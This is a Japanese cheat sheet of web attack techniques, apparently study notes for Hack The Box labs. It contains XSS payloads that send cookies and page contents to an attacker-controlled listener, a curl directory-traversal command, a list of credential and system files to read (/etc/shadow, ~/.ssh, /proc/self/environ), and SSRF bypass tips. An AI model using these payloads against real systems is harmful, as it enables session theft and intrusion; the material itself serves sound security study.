# Webの脆弱性活用

## ライブラリ脆弱性の活用
レスポンスヘッダやWappalyzerからバージョン情報を取得できる場合、そのバージョンに存在する重大な脆弱性が報告されていないかと検索する。

https://www.wappalyzer.com/

## XSS
攻撃対象にXSSでスクリプトを実行させることが可能な場合、以下のようなコードを実行させて自分のサーバに情報を送らせる。
HTBにおいてはローカルネット内で完結しているためポート解放や外部のサーバを借りる必要はない。

ncコマンドで受信側（自分のサーバ）を用意する
```
nc -lvnp 4444
```

Cookieを取得（http-only属性が付いていない場合）
```
<script>
  fetch('http://<<受信側（自分のサーバ）のIP>>:4444/', {
            method: 'POST',
            mode: 'no-cors',
            body:document.cookie
      });
</script>
```

指定したページにアクセスさせた結果を取得（レスポンスボディ）
```
<script>
fetch("http://<<アクセスさせたページのパス>>").then(r=>r.text()).then(z=>navigator.sendBeacon("http://<<受信側（自分のサーバ）のIP>>:4444/", z))
</script>
```

## ディレクトリトラバーサル
curlでディレクトリトラバーサル攻撃を行う場合、--path-as-isオプションが必要。（curl側でのパスの正規化を防ぐため）
```
curl --path-as-is http//example.com/../../../etc/hosts
```

ディレクトリトラバーサルが可能な場合、以下のようなファイルを調査すると良い

* /etc
    * /etc/hosts ホスト情報
    * /etc/passwd ユーザ情報
    * /etc/shadow ユーザのパスワードハッシュ
    * /etc/apache2 apache設定ファイル
        * /etc/apache2/apache2.conf 
        * /etc/apache2/sites-enabled/000-default.conf
    * /etc/nginx nginx設定ファイル
        * /etc/nginx/nginx.conf
        * /etc/nginx/sites-enabled/default
        * /etc/nginx/sites-available/default
* /proc
    * /proc/self 実行中プロセスの情報
        * /proc/self/maps メモリマップ
        * /proc/self/mem 実際のメモリへのシンボリックリンク
        * /proc/self/cwd カレントディレクトリ
        * /proc/self/environ 環境変数
        * /proc/self/cmdline 実行時のコマンド
* /var
    * /var/www/html Webの公開ファイル
* ~
    * ~/.ssh sshの情報
    * ~/.bash_history bashの履歴


## SSRF
localhostを示すURLのフィルター回避は以下を参考
https://github.com/b4rdia/HackTricks/blob/master/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass.md

dictスキームやgopherスキームを使用することで任意のバイト列を流すことができる。
（例）gopher:// でRESP形式のコマンドを送ることでRedisを操作可能
https://qiita.com/nus/items/374ad5869f471da5b5cf
